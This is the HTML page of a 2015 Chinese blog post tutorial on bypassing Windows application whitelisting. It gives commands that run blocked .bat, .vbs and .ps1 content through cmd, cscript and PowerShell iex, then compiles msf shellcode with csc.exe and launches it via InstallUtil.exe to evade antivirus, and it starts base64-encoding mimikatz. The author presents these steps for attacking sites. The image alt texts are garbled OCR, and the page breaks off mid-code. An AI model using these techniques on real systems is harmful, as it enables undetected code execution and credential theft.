@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 前言 看了subTee的在ShmooCon2015的PPT，学习到了很多关于应用白名单绕过的技巧，今天又看见了subTee开始写博客了，并且详细解释了关于应用白名单绕过的方法，于是结合自己测试与大家分享一下。 看完ppt其实作者是想告诉我们一种思想，我自己的理解是“利用信任程序执行恶意代码“。&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;   0x01 脚本执行&amp;lt;o:p&amp;gt;&amp;l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用白名单应用绕过防护">
+<meta property="og:url" content="http://yoursite.com/2015/08/28/e5-88-a9-e7-94-a8-e7-99-bd-e5-90-8d-e5-8d-95-e5-ba-94-e7-94-a8-e7-bb-95-e8-bf-87-e9-98-b2-e6-8a-a4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 前言 看了subTee的在ShmooCon2015的PPT，学习到了很多关于应用白名单绕过的技巧，今天又看见了subTee开始写博客了，并且详细解释了关于应用白名单绕过的方法，于是结合自己测试与大家分享一下。 看完ppt其实作者是想告诉我们一种思想，我自己的理解是“利用信任程序执行恶意代码“。&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;   0x01 脚本执行&amp;lt;o:p&amp;gt;&amp;l">
+<meta property="og:image" content="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image002e7de5b8c-a415-4684-b70c-b4e3331da3fe.jpg">
+<meta property="og:image" content="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image004699c5601-2d34-4798-a2c2-dd9e98b15627.jpg">
+<meta property="og:image" content="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image006edace60a-5f79-4648-bc14-cee12d830638.jpg">
+<meta property="og:image" content="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image008dc7cbd69-3680-491a-b250-7fb6a0754aae.jpg">
+<meta property="og:image" content="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image010ed679b88-d651-4529-b810-5165ff9a767a.jpg">
+<meta property="og:image" content="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image0122b446ae6-a163-41b0-83f8-90766d01d629.jpg">
+<meta property="og:image" content="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image0149996df9e-a63a-40ea-a02c-014cb8e7760a.jpg">
+<meta property="og:updated_time" content="2018-02-26T06:02:35.150Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用白名单应用绕过防护">
+<meta name="twitter:description" content="0x00 前言 看了subTee的在ShmooCon2015的PPT，学习到了很多关于应用白名单绕过的技巧，今天又看见了subTee开始写博客了，并且详细解释了关于应用白名单绕过的方法，于是结合自己测试与大家分享一下。 看完ppt其实作者是想告诉我们一种思想，我自己的理解是“利用信任程序执行恶意代码“。&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;   0x01 脚本执行&amp;lt;o:p&amp;gt;&amp;l">
+<meta name="twitter:image" content="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image002e7de5b8c-a415-4684-b70c-b4e3331da3fe.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2015/08/28/e5-88-a9-e7-94-a8-e7-99-bd-e5-90-8d-e5-8d-95-e5-ba-94-e7-94-a8-e7-bb-95-e8-bf-87-e9-98-b2-e6-8a-a4/"/>
+
+
+
+
+
+  <title>利用白名单应用绕过防护 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2015/08/28/e5-88-a9-e7-94-a8-e7-99-bd-e5-90-8d-e5-8d-95-e5-ba-94-e7-94-a8-e7-bb-95-e8-bf-87-e9-98-b2-e6-8a-a4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">利用白名单应用绕过防护</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-08-28T22:51:15+08:00">
+                2015-08-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">0x00 </span></span><span style="font-size: 10.5pt; line-height: 1.5;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">前言</span></span></strong></p>
+<p><span style="font-size: 10.5pt; line-height: 1.5;">看了</span><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;">subTee</span><span style="font-size: 10.5pt; line-height: 1.5;">的在</span><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;">ShmooCon2015</span><span style="font-size: 10.5pt; line-height: 1.5;">的</span><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;">PPT</span><span style="font-size: 10.5pt; line-height: 1.5;">，学习到了很多关于应用白名单绕过的技巧，今天又看见了</span><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;">subTee</span><span style="font-size: 10.5pt; line-height: 1.5;">开始写博客了，并且详细解释了关于应用白名单绕过的方法，于是结合自己测试与大家分享一下。</span></p>
+<p><span style="font-size:10.5pt">看完</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">ppt</span><span style="font-size:10.5pt">其实作者是想告诉我们一种思想，我自己的理解是</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">“</span><span style="font-size:10.5pt">利用信任程序执行恶意代码</span><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">“</span><span style="font-size:
+10.5pt">。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 14pt;"><strong>
+</strong></span></span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 14pt;"><strong>0x01 </strong></span></span><span style="font-size:
+10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 14pt;"><strong>脚本执行</strong></span><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span style="font-size:10.5pt">当在一些情况下，比如限制了</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">.</span><span lang="EN-US" style="font-size:10.5pt">bat|.vbs|.ps1</span><span style="font-size:
+10.5pt">脚本执行，我们可以通过以下方法绕过<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;bat &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cmd&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;k &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;txt&amp;nbsp;&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;vbs&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cscript&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;//E:vbscript script.txt&amp;nbsp; &lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ps1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Get&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;txt &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; iex&lt;/span&gt;</code></pre></div>
+
+<p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image002e7de5b8c-a415-4684-b70c-b4e3331da3fe.jpg" alt="说明: 计算机生成了可选文字: 扮…
+｛一”￡e护忿
+ne卜。。～_
+刀esktop勺，ore&gt;echonetuse护＞abc。txt
+口
+刃esktop劝lore&gt;t夕peabc。txt
+劝sers、
+劝】sers">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image004699c5601-2d34-4798-a2c2-dd9e98b15627.jpg" alt="说明: 计算机生成了可选文字: 劝】sers、
+刀esktop勺110护e&gt;echoHsgbox&quot;abc&quot;&gt;abcd。txt
+山se护s\
+gbox&quot;abc&quot;
+乃esktop为110护e&gt;t夕peabcd。txt
+劝】sers、
+刀esktop勺Ilore&gt;cscriPt
+.eXe
+//F:vbscriPtabcd。txt
+ic护osoft
+&lt;R&gt;Uindo&quot;s
+权所有＜c)
+HicrosoFt
+Sc护iptHost
+Corpo护ation
+Ue护Sions。8
+1996一2日日10
+保留所有权利。">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image006edace60a-5f79-4648-bc14-cee12d830638.jpg" alt="说明: 计算机生成了可选文字: ：劝sers＼刀esktop场ore&gt;po&quot;e护shell
+indo讨5Po&quot;erghell
+权所有＜c)2朋，
+Hic护osoftCorporation。
+保留所有权利。
+SC：劝」sers">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span style="font-size:10.5pt">测试的时候请注意编码这个坑，如果你自己新建一个文件手动写</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">“net<br>user”</span><span style="font-size:10.5pt">到文件测试，你会发现不成功，所以请用</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">echo</span><span style="font-size:10.5pt">。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image008dc7cbd69-3680-491a-b250-7fb6a0754aae.jpg" alt="说明: 计算机生成了可选文字: {
+勺」忍e犷公＼
+叨se犷公‘
+山，eP。＼
+Desktop城。护e&gt;cod。exe/k&lt;1。txt
+刀e">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US"><br></span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;"><strong>0x01 </strong></span></span><span style="font-size:
+10.5pt"><strong><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">利用</span><span lang="EN-US"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">InstallUtil.exe</span></span><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">执行程序</span></strong><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span style="font-size:10.5pt">有些时候搞站遇到不能执行</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">exe</span><span style="font-size:10.5pt">，或者是杀毒软件太厉害，这个方法很好的绕过了检测。当然环境种必须是</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">.</span><span lang="EN-US" style="font-size:10.5pt">net4.0</span><span style="font-size:10.5pt">以上。</span></p>
+<p><span style="font-size:10.5pt"><br></span></p>
+<p><strong><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">1.</span></span><span style="font-size:
+10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">直接用</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">msf</span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">生成</span></span><span lang="EN-US" style="font-size:10.5pt;
+font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">shellcode</span></span><span style="font-size:
+10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">，执行</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">shellcode</span></span></strong><span lang="EN-US" style="font-size:10.5pt">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Step&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;One&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unsafe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;platform&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;x64 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exeshell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Shellcode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Step&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Two&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\InstallUtil&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;logfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;LogToConsole&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;U exeshell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&lt;/span&gt;</code></pre></div>
+
+<p><span style="font-size:10.5pt">当然了，如果你想第一步自己本地搞定，然后第二部再上传服务器执行也行。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image010ed679b88-d651-4529-b810-5165ff9a767a.jpg" alt="说明: 计算机生成了可选文字: c：叨二e，二＼Pentest叨esktop场。，e&gt;c，咐indo。，训ic&quot;0,oft·HFI咄斌
+c。exe/unsafe/platforn:x64/out:exeshell。exeShellcode。c
+Hic护osoft&lt;R&gt;Uisua1C林2日1日Conpilerue犷公ion4。日。3日31，。1
+Cop夕护ight&lt;C&gt;HicrosoftCorporation.nllrightsrese护ued。
+口巴王月口巨曰口困
+查看少）编辑汪）帮助0f)
+0
+C：劝se护s凡Pentest凡Desktop勺110护e&gt;C：劝Jindo&quot;s、洲ic护osoft。HFT
+StdllUtil。eXe
+HIC护OS0ft&lt;R&gt;
+Cop夕护ight&lt;c&gt;
+/logfile=/LogToConsole=false/Uexeshell。e已
+。HETF护ane衬orkIn忿tallationutilit夕Ue护sion
+HicrosoftCo护poration。自11护ights护ese护ued。
+邑盆山丝丝全呢尸t熙土业丝丛卫冗翅业业一｝
+州州州习习
+到到到到川
+到川到川习
+到到到习到
+canbeUn布nstall/Install.Install浦5transact浦onal,andr.
+」evo嘴dUn有nstall(System.Collect瑞ons.ID布ct嘴onarysavedstate:
+到到到曰
+｝曰习
+日
+,EXec();">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US"><br></span></p>
+<p><strong><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">2.</span></span><span style="font-size:
+10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">直接执行</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">pe</span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">文件（执行</span></span><span lang="EN-US" style="font-size:10.5pt;
+font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">mimikatz</span></span></strong><span style="font-size:10.5pt"><strong><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">）</span></strong><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span style="font-size:10.5pt">如果是</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">pe</span><span style="font-size:10.5pt">文件，需要先把</span><span lang="EN-US" style="font-size:10.5pt;
+font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">pe</span><span style="font-size:10.5pt">文件</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">base64</span><span style="font-size:10.5pt">编码，有两种方法：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Base64&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Encode&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Mimikatz&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;In&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;$fileName &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;mimikatz.exe&quot;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$fileContent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; get&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content $fileName&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;$fileContentBytes &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span 